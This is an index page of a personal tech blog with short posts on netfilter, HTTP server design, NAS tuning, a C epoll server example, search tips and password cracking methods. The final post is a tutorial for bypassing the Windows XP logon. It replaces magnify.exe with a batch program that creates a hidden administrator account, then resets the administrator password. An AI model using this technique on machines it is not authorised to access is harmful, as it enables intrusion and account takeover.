<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Matrix207&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Matrix207's Blog">
<meta property="og:url" content="http://matrix207.github.com/page/10/index.html">
<meta property="og:site_name" content="Matrix207's Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Matrix207's Blog">
<meta name="twitter:description">
  
    <link rel="alternate" href="/atom.xml" title="Matrix207&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Matrix207&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://matrix207.github.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-netfilter-hacking" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/14/netfilter-hacking/" class="article-date">
  <time datetime="2014-04-13T16:00:00.000Z" itemprop="datePublished">2014-04-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/network/">network</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/14/netfilter-hacking/">netfilter hacking</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="netfilter-hacking"><a href="#Netfilter-hacking" class="headerlink" title="Netfilter hacking"></a>Netfilter hacking</h3><h3 id="reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="http://www.netfilter.org/documentation/HOWTO/netfilter-hacking-HOWTO.html#toc3.3" target="_blank" rel="external">Netfilter hacking HOWTO</a></li>
<li><a href="http://inai.de/documents/Netfilter_Modules.pdf" target="_blank" rel="external">Write netfilter modules</a></li>
<li><a href="http://www.ibm.com/developerworks/cn/linux/l-ntflt/" target="_blank" rel="external">Linux Netfilter&#x5B9E;&#x73B0;&#x673A;&#x5236;&#x548C;&#x6269;&#x5C55;&#x6280;&#x672F;</a></li>
<li><a href="http://blog.chinaunix.net/uid-27064719-id-3503855.html" target="_blank" rel="external">&#x5341;&#x56DB; &#x6D1E;&#x6089;linux&#x4E0B;&#x7684;Netfilter&amp;iptables&#xFF1A;&#x5F00;&#x53D1;&#x4E00;&#x4E2A;match&#x6A21;&#x5757;&#x3010;&#x5B9E;&#x6218;&#x3011;</a></li>
<li><a href="http://blog.ownlinux.net/2010/05/netfilter-kernel-source-code-intro.html" target="_blank" rel="external">Linux&#x5185;&#x6838;&#x4E2D;&#x7684;Netfilter&#x4ECB;&#x7ECD;</a></li>
<li><a href="https://github.com/platinum-PT/xt_domain.git" target="_blank" rel="external">iptables domain filter</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/04/14/netfilter-hacking/" data-id="cinefv7150094jiiza0f1hliz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/network/">network</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-how-to-implement-a-http-server-in-c-on-linux" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/14/how-to-implement-a-http-server-in-c-on-linux/" class="article-date">
  <time datetime="2014-04-13T16:00:00.000Z" itemprop="datePublished">2014-04-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/network/">network</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/14/how-to-implement-a-http-server-in-c-on-linux/">how to implement a http server in c on linux</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="1use-existing-open-source"><a href="#1-use-existing-open-source" class="headerlink" title="1.use existing open source"></a>1.use existing open source</h3><ul>
<li>Apache </li>
<li>Nginx</li>
</ul>
<h3 id="2use-librarys"><a href="#2-use-librarys" class="headerlink" title="2.use librarys"></a>2.use librarys</h3><ul>
<li>Python HTTPServer / CGIHTTPServer</li>
<li>libevent</li>
</ul>
<h3 id="3implement-it-in-c"><a href="#3-implement-it-in-c" class="headerlink" title="3.implement it in c"></a>3.implement it in c</h3><ul>
<li><p>basic (learn from APUE/UNP)<br>1.HTTP protocol(RFC 2616)<br>2.TCP server(select/poll/epoll)<br>3.multi-process model(fork, one proces per connection)<br>4.multi-thread model(one thread per connection)<br>5.IPC (interprocess communication)<br>6.NON-Block I/O, edge trigger  </p>
</li>
<li><p>advanced (learn from open source, lots pagers)<br>1.performance optimists: memory cached, I/O(linux AIO), TCP/IP<br>2.support CGI/FastCGI/WSGI/AJK<br>3.support HTTPS<br>4.dynamic modules<br>5.support cluster  </p>
</li>
</ul>
<h3 id="4reference"><a href="#4-Reference" class="headerlink" title="4.Reference"></a>4.Reference</h3><ul>
<li>[1]<a href="http://www.zhihu.com/question/20199473" target="_blank" rel="external">&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;http&#x670D;&#x52A1;&#x5668;&#x9700;&#x8981;&#x600E;&#x6837;&#x8FDB;&#x884C;&#xFF1F;&#x9700;&#x8981;&#x54EA;&#x4E9B;&#x77E5;&#x8BC6;&#x5462;</a></li>
<li>[2]<a href="http://stackoverflow.com/questions/2338775/how-do-i-write-a-web-server-in-c-on-linux" target="_blank" rel="external">how-do-i-write-a-web-server-in-c-on-linux</a></li>
<li>[3]<a href="http://en.wikipedia.org/wiki/Comparison_of_lightweight_web_servers" target="_blank" rel="external">Comparison of lightweight web servers</a></li>
<li>[4]<a href="http://www.ruilog.com/article/view/5249.html" target="_blank" rel="external">libevent webserver in 40 lines of c</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/04/14/how-to-implement-a-http-server-in-c-on-linux/" data-id="cinefv7140091jiizrcrh9dbt" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/network/">network</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-how-to-write-a-good-web-server" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/12/how-to-write-a-good-web-server/" class="article-date">
  <time datetime="2014-04-11T16:00:00.000Z" itemprop="datePublished">2014-04-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/network/">network</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/12/how-to-write-a-good-web-server/">how to write a good web server</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="server-module"><a href="#Server-module" class="headerlink" title="Server module"></a>Server module</h3><ul>
<li>1.<strong>select</strong> based server<br>  Advantage:  easy to implement<br>  disadvantage: limit to fd, max is 1024 on most linux  </li>
<li>2.<strong>/dev/poll</strong> based server<br>  Advantage:<br>  disadvantage: same to select  </li>
<li>3.<strong>epoll</strong> based server<br>  Advantage: fastly, not need to check each fd.<br>  disadvantage: do more coding  </li>
<li>4.<strong>thread</strong> based server<br>  Advantage: cheap to create, easy to share memory<br>  disadvantage: instability, crash thread make entry process down because all<pre><code>threads share the same addres space.  
</code></pre></li>
<li>5.<strong>process</strong> based server<br>  Advantage: stable, crash process do not effect others.<br>  disadvantage: create and kill processs overhead the web server.  </li>
<li>6.<strong>hybrid process thread</strong> server<br>  Advantage:<br>  disadvantage:  </li>
<li>7.<strong>process-pool</strong> and <strong>thread-pool</strong> based server<br>  process pool, reference<br>  <a href="http://stackoverflow.com/questions/16286208/dynamic-pool-of-processes" target="_blank" rel="external">dynamic-pool-of-processes</a><br>  <a href="http://www.devshed.com/c/a/Administration/Design-and-Architecture/3/" target="_blank" rel="external">Preforking: Process Pools</a><br>  <a href="http://blog.chinaunix.net/uid-20481436-id-1941519.html" target="_blank" rel="external">3</a><br>  Advantage:<br>  disadvantage:  </li>
<li>8.<strong>event</strong> based server<br>  Advantage:<br>  disadvantage:  </li>
</ul>
<h3 id="biggest-performance-killers"><a href="#Biggest-performance-killers" class="headerlink" title="Biggest performance-killers"></a>Biggest performance-killers</h3><ul>
<li>1.Data copies  </li>
<li>2.Context switches  </li>
<li>3.Memory allocation  </li>
<li>4.Lock contention  </li>
</ul>
<h3 id="reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="http://www.kegel.com/c10k.html#examples.nb.select" target="_blank" rel="external"><strong>The C10K problem</strong></a></li>
<li><a href="http://bulk.fefe.de/scalable-networking.pdf" target="_blank" rel="external"><strong>Scalable Network Programming</strong></a></li>
<li><a href="http://pl.atyp.us/content/tech/servers.html" target="_blank" rel="external">High performance server architecture</a></li>
<li><a href="http://en.wikipedia.org/wiki/Comparison_of_lightweight_web_servers" target="_blank" rel="external">Comparison of web server software</a></li>
<li><a href="https://code.google.com/p/mongoose" target="_blank" rel="external">mongoose - easy to use web server</a></li>
<li><a href="http://edsiper.linuxchile.cl/blog/2013/02/27/architecture-of-a-linux-based-web-server/" target="_blank" rel="external">Architecture of a Linux based Web Server - Monkey HTTP server</a></li>
<li><a href="https://github.com/monkey/monkey" target="_blank" rel="external">Monkey HTTP server</a></li>
<li><a href="http://blog.abhijeetr.com/2010/04/very-simple-http-server-writen-in-c.html" target="_blank" rel="external">A very simple HTTP server writen in c</a></li>
<li><a href="https://github.com/ashishc/Http-Server#!" target="_blank" rel="external">HTTP-server</a></li>
<li><a href="http://stackoverflow.com/questions/2338775/how-do-i-write-a-web-server-in-c-on-linux" target="_blank" rel="external">How do I write a web server in C on linux</a></li>
<li><a href="https://github.com/search?l=C&amp;q=webserver&amp;ref=cmdform&amp;type=Repositories" target="_blank" rel="external">webserver search on github</a></li>
<li><a href="http://jakash3.wordpress.com/2011/03/08/simple-webserver-for-linux/" target="_blank" rel="external">simple webserver for linux</a></li>
<li><a href="http://sce.umkc.edu/~leeyu/class/cs551-04/papers/noshaba.pdf" target="_blank" rel="external">Web server software architectures</a></li>
<li><a href="https://github.com/lyjdamzwf/chaos" target="_blank" rel="external">chaos - c++ network event library</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/04/12/how-to-write-a-good-web-server/" data-id="cinefv70z008vjiizzsc9ag8r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/network/">network</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-nas-storage-system-performance-optimization" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/12/nas-storage-system-performance-optimization/" class="article-date">
  <time datetime="2014-04-11T16:00:00.000Z" itemprop="datePublished">2014-04-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/storage/">storage</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/12/nas-storage-system-performance-optimization/">NAS storage system performance optimization</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="nas"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h3><p>Network attach storage, there are two protocol NFS(Linux) and CIFS(windows)</p>
<h3 id="nfs"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><p>1.use UDP or TCP<br>2.modify rsize and wsize<br>3.use sync or async  </p>
<h3 id="cifs"><a href="#CIFS" class="headerlink" title="CIFS"></a>CIFS</h3><p>1.smb or smb2<br>2.modify rsize and wsize<br>3.prefetch  </p>
<h3 id="tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p>Watch the memory,disk I/O and net speed.<br>1.vmstat<br>2.cat /proc/cpuinfo, /proc/meminfo, /proc/net/dev  </p>
<h3 id="reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="http://www.huawei.com/ecommunity/bbs/10167439.html" target="_blank" rel="external">&#x5B58;&#x50A8;&#x8BFE;&#x5802;:NAS&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x4F18;&#x5316;&#x653B;&#x7565;</a></li>
<li><a href="https://calomel.org/samba_optimize.html" target="_blank" rel="external">samba optimization and speed tuning for performance</a></li>
<li><a href="https://wiki.amahi.org/index.php/Make_Samba_Go_Faster" target="_blank" rel="external">make samba go faster</a></li>
<li><a href="http://niyunjiu.iteye.com/blog/661141" target="_blank" rel="external">samba&#x6027;&#x80FD;&#x8C03;&#x4F18;</a></li>
<li><a href="http://wisebyte.blogspot.com/2014/02/mavericks-nfs-vs-smb-implementation.html" target="_blank" rel="external">Mavericks NFS vs SMB Implementation - Speed Test</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/04/12/nas-storage-system-performance-optimization/" data-id="cinefv710008yjiizihvcp7vi" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/storage/">storage</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-epoll-example-in-c" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/10/epoll-example-in-c/" class="article-date">
  <time datetime="2014-04-09T16:00:00.000Z" itemprop="datePublished">2014-04-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/language/">language</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/10/epoll-example-in-c/">epoll example in c</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="difference-between-slect-poll-and-epoll"><a href="#difference-between-slect-poll-and-epoll" class="headerlink" title="difference between slect poll and epoll"></a>difference between slect poll and epoll</h3><p>There are other reasons to avoid select and use epoll. When using select, you<br>don&#x2019;t know how many descriptors need attention. So you must keep track of the<br>biggest and loop to it.</p>
<pre><code>rc = select(...);
/* check rc */
for (s = 0; s &lt;= maxfd; s++) {
    if (FD_ISSET(s)) {
        /* ... */
    }
}
</code></pre><p>Now with epoll it&#x2019;s a lot cleaner:</p>
<pre><code>nfds = epoll_wait(epollfd, events, MAX_EVENTS, -1);
/* check nfds */
for (n = 0; n &lt; nfds; ++n) {
    /* events[n].data.fd needs attention */
}
</code></pre><h3 id="do-fork-process-before-create_epoll"><a href="#do-fork-process-before-create-epoll" class="headerlink" title="do fork process before create_epoll"></a>do fork process before create_epoll</h3><h3 id="epoll-example-in-c"><a href="#Epoll-example-in-C" class="headerlink" title="Epoll example in C"></a>Epoll example in C</h3><pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/epoll.h&gt;
#include &lt;errno.h&gt;

#define MAXEVENTS 64

static int
make_socket_non_blocking (int sfd)
{
    int flags, s;

    flags = fcntl (sfd, F_GETFL, 0);
    if (flags == -1)
    {
        perror (&quot;fcntl&quot;);
        return -1;
    }

    flags |= O_NONBLOCK;
    s = fcntl (sfd, F_SETFL, flags);
    if (s == -1)
    {
        perror (&quot;fcntl&quot;);
        return -1;
    }

    return 0;
}

static int
create_and_bind (char *port)
{
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;

    memset (&amp;hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
    hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
    hints.ai_flags = AI_PASSIVE;     /* All interfaces */

    s = getaddrinfo (NULL, port, &amp;hints, &amp;result);
    if (s != 0)
    {
        fprintf (stderr, &quot;getaddrinfo: %s\n&quot;, gai_strerror (s));
        return -1;
    }

    for (rp = result; rp != NULL; rp = rp-&gt;ai_next)
    {
        sfd = socket (rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);
        if (sfd == -1)
            continue;

        s = bind (sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen);
        if (s == 0)
        {
            /* We managed to bind successfully! */
            break;
        }

        close (sfd);
    }

    if (rp == NULL)
    {
        fprintf (stderr, &quot;Could not bind\n&quot;);
        return -1;
    }

    freeaddrinfo (result);

    return sfd;
}

int
main (int argc, char *argv[])
{
    int sfd, s;
    int efd;
    struct epoll_event event;
    struct epoll_event *events;

    if (argc != 2)
    {
        fprintf (stderr, &quot;Usage: %s [port]\n&quot;, argv[0]);
        exit (EXIT_FAILURE);
    }

    sfd = create_and_bind (argv[1]);
    if (sfd == -1)
        abort ();

    s = make_socket_non_blocking (sfd);
    if (s == -1)
        abort ();

    s = listen (sfd, SOMAXCONN);
    if (s == -1)
    {
        perror (&quot;listen&quot;);
        abort ();
    }

    efd = epoll_create1 (0);
    if (efd == -1)
    {
        perror (&quot;epoll_create&quot;);
        abort ();
    }

    event.data.fd = sfd;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl (efd, EPOLL_CTL_ADD, sfd, &amp;event);
    if (s == -1)
    {
        perror (&quot;epoll_ctl&quot;);
        abort ();
    }

    /* Buffer where events are returned */
    events = calloc (MAXEVENTS, sizeof event);

    /* The event loop */
    while (1)
    {
        int n, i;

        n = epoll_wait (efd, events, MAXEVENTS, -1);
        for (i = 0; i &lt; n; i++)
        {
            if ((events[i].events &amp; EPOLLERR) ||
                    (events[i].events &amp; EPOLLHUP) ||
                    (!(events[i].events &amp; EPOLLIN)))
            {
                /* An error has occured on this fd, or the socket is not
                   ready for reading (why were we notified then?) */
                fprintf (stderr, &quot;epoll error\n&quot;);
                close (events[i].data.fd);
                continue;
            }

            else if (sfd == events[i].data.fd)
            {
                /* We have a notification on the listening socket, which
                   means one or more incoming connections. */
                while (1)
                {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd;
                    char hbuf[NI_MAXHOST], sbuf[NI_MAXSERV];

                    in_len = sizeof in_addr;
                    infd = accept (sfd, &amp;in_addr, &amp;in_len);
                    if (infd == -1)
                    {
                        if ((errno == EAGAIN) ||
                                (errno == EWOULDBLOCK))
                        {
                            /* We have processed all incoming
                               connections. */
                            break;
                        }
                        else
                        {
                            perror (&quot;accept&quot;);
                            break;
                        }
                    }

                    s = getnameinfo (&amp;in_addr, in_len,
                            hbuf, sizeof hbuf,
                            sbuf, sizeof sbuf,
                            NI_NUMERICHOST | NI_NUMERICSERV);
                    if (s == 0)
                    {
                        printf(&quot;Accepted connection on descriptor %d &quot;
                                &quot;(host=%s, port=%s)\n&quot;, infd, hbuf, sbuf);
                    }

                    /* Make the incoming socket non-blocking and add it to the
                       list of fds to monitor. */
                    s = make_socket_non_blocking (infd);
                    if (s == -1)
                        abort ();

                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl (efd, EPOLL_CTL_ADD, infd, &amp;event);
                    if (s == -1)
                    {
                        perror (&quot;epoll_ctl&quot;);
                        abort ();
                    }
                }
                continue;
            }
            else
            {
                /* We have data on the fd waiting to be read. Read and
                   display it. We must read whatever data is available
                   completely, as we are running in edge-triggered mode
                   and won&apos;t get a notification again for the same
                   data. */
                int done = 0;

                while (1)
                {
                    ssize_t count;
                    char buf[512];

                    count = read (events[i].data.fd, buf, sizeof buf);
                    if (count == -1)
                    {
                        /* If errno == EAGAIN, that means we have read all
                           data. So go back to the main loop. */
                        if (errno != EAGAIN)
                        {
                            perror (&quot;read&quot;);
                            done = 1;
                        }
                        break;
                    }
                    else if (count == 0)
                    {
                        /* End of file. The remote has closed the
                           connection. */
                        done = 1;
                        break;
                    }

                    /* Write the buffer to standard output */
                    s = write (1, buf, count);
                    if (s == -1)
                    {
                        perror (&quot;write&quot;);
                        abort ();
                    }
                }

                if (done)
                {
                    printf (&quot;Closed connection on descriptor %d\n&quot;,
                            events[i].data.fd);

                    /* Closing the descriptor will make epoll remove it
                       from the set of descriptors which are monitored. */
                    close (events[i].data.fd);
                }
            }
        }
    }

    free (events);

    close (sfd);

    return EXIT_SUCCESS;
}
</code></pre><h3 id="reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="https://banu.com/blog/2/how-to-use-epoll-a-complete-example-in-c/" target="_blank" rel="external">How to use epoll? A complete example in C</a></li>
<li><a href="http://stackoverflow.com/questions/6474602/does-epoll-do-its-job-in-o1" target="_blank" rel="external">Does epoll(), do its job in O(1)?</a></li>
<li><a href="http://www.cppblog.com/converse/archive/2008/10/08/63504.html" target="_blank" rel="external">&#x591A;&#x8FDB;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x4E2D;,epoll&#x7684;&#x521B;&#x5EFA;&#x5E94;&#x8BE5;&#x5728;&#x521B;&#x5EFA;&#x5B50;&#x8FDB;&#x7A0B;&#x4E4B;&#x540E;</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/04/10/epoll-example-in-c/" data-id="cinefv70y008sjiiz1xscebs8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/c/">c</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-search-tips-and-tricks" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/04/search-tips-and-tricks/" class="article-date">
  <time datetime="2014-04-03T16:00:00.000Z" itemprop="datePublished">2014-04-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/others/">others</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/04/search-tips-and-tricks/">search tips and tricks</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul>
<li><p>search with specific site<br>Precede your query with site: if you know you want your answer from within a<br>specific site or type of site (.org, .edu). For example: site:edu or<br>site:nytimes.com. </p>
<p>  op-ed site:nytimes.com    </p>
</li>
<li><p>search by file type<br>Search for specific types of files, such as PDFs, PPTs, or XLS, by adding<br>filetype: and the 3-letter file abbreviation. </p>
<p>  affordable health care act filetype:ppt    </p>
</li>
<li><p>get definition<br>put define: in front of any word to get its definition.</p>
<p>  define: loquaciousness</p>
</li>
</ul>
<h3 id="reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="https://www.google.com/insidesearch/tipstricks/all.html" target="_blank" rel="external">googl search tips and tricks</a></li>
<li><a href="https://www.google.com/intl/zh-CN/insidesearch/tipstricks/all.html" target="_blank" rel="external">googl search tips and tricks&#x2013;chinese</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/04/04/search-tips-and-tricks/" data-id="cinefv70x008ojiizl0zi57h7" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/google/">google</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-how-strong-is-your-password" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/03/how-strong-is-your-password/" class="article-date">
  <time datetime="2014-04-02T16:00:00.000Z" itemprop="datePublished">2014-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/others/">others</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/03/how-strong-is-your-password/">how strong is your password</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>When we step into e-age, there are so many time we need to use internect to do<br>things, and then there are so many password we need to use, the password like a<br>key to the lock, we want the only-know guy is ourselves. But hackers can stole<br>them so easy, because we use too many weak password. Thinking, how can the<br>hackers do that, and how to avoid this things happen again, let us start to<br>study, to know what we need?</p>
<h4 id="questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h4><ul>
<li>How to make a strong password?</li>
<li>How long to crack a password by person machine?</li>
<li>Is there any good and safe online site or software to calculate the strength<br>of password?</li>
<li>How to calculate the strength of password?</li>
</ul>
<h4 id="methods-of-crack"><a href="#Methods-of-crack" class="headerlink" title="Methods of crack"></a>Methods of crack</h4><ul>
<li><strong>Dictionary attacks</strong><br>This is simple. The attackers just need to keep the 10^6 most common passwords<br>in use, and check each of them once. This can be done well under one second.<br>If your password is in the list, then it can probably be cracked nearly<br>instantaneously.</li>
<li><strong>Brute force</strong><br>If your password isn&#x2019;t in a dictionary, then one other option is to use brute<br>force. The time taken to crack a password using this method depends on (a) the<br>length of the password, and (b) the symbol set that comprises the password. </li>
<li><strong>Combined methods</strong><br>This relies on a combination of ingenuity and brute force. It&#x2019;s a mix between<br>the first two methods, and relies on common &#x201C;password conventions&#x201D; rather than<br>common passwords.</li>
</ul>
<h4 id="implement-code"><a href="#Implement-code" class="headerlink" title="Implement code"></a>Implement code</h4><ul>
<li>Implement with C [TODO]</li>
<li>Implement with other language [TODO]</li>
</ul>
<h4 id="reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul>
<li><a href="http://en.wikipedia.org/wiki/Password_strength#Password_guess_validation" target="_blank" rel="external">wikipedia: Password strength</a></li>
<li><a href="http://stackoverflow.com/questions/12578851/howsecureismypassword-com-algorithm" target="_blank" rel="external">howsecureismypassword.com algorithm</a></li>
<li><a href="https://howsecureismypassword.net/" target="_blank" rel="external">password strength checking</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/04/03/how-strong-is-your-password/" data-id="cinefv70w008ljiiz5liiaurq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/others/">others</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hack-windows-xp-logon-password" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/03/21/hack-windows-xp-logon-password/" class="article-date">
  <time datetime="2014-03-20T16:00:00.000Z" itemprop="datePublished">2014-03-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/windows/">windows</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/03/21/hack-windows-xp-logon-password/">Hack windows xp logon password</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="hack-steps"><a href="#Hack-steps" class="headerlink" title="Hack steps:"></a>Hack steps:</h3><p>1.create a batch file, name magnify.bat<br>  add code as below:</p>
<pre><code>@net user hack 123456 /add

@net localgroup administrators hack /add

@exit
</code></pre><p>2.convert magnify.bat to magnify.exe by<br>  bat2com.exe and com2exe.exe, then use<br>  command as below:</p>
<pre><code>bat2com.exe magnify.bat

com2exe.exe magnify.com
</code></pre><p>3.replace file c:/windows/system32/magnify.exe<br>  there are many ways to done this, one way is<br>  burn a WinPE system to a U-disk, then login<br>  the WinPE syste to replace it, you can use<br>  other system(such as linux live CD) also;<br>  another way is mount the hard disk to other<br>  computer to do it.</p>
<p>4.power on computer, type win+u to run magnify<br>  at the logon screen. select and run the magnify program </p>
<p>5.use hack to login, then change the password of<br>  administrator and delete hack in command line.<br>  use commands as below:</p>
<pre><code>net user (list user)

net localgroup administrators (list user belong to administrators group)

net user administrator 123456 (modify password)

net user hack /del (delete user)
</code></pre><p>6.reboot and enjoy.</p>
<h3 id="reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h3><ul>
<li><a href="https://www.doorcome.com/?p=42" target="_blank" rel="external">&#x5F97;&#x5230;WindowsXP&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#x7684;&#x6709;&#x6548;&#x65B9;&#x6CD5;</a></li>
<li><a href="http://www.computersecuritystudent.com/FORENSICS/Password_Clearing/lesson1/index.html" target="_blank" rel="external">Password Clearing: Clearing out any windows password</a></li>
<li><a href="http://www.pogostick.net/~pnh/ntpasswd/" target="_blank" rel="external">Offline windows password &amp; Registry editor</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/03/21/hack-windows-xp-logon-password/" data-id="cinefv70u008ijiizuklqoqax" class="article-share-link">Share</a>
      
      
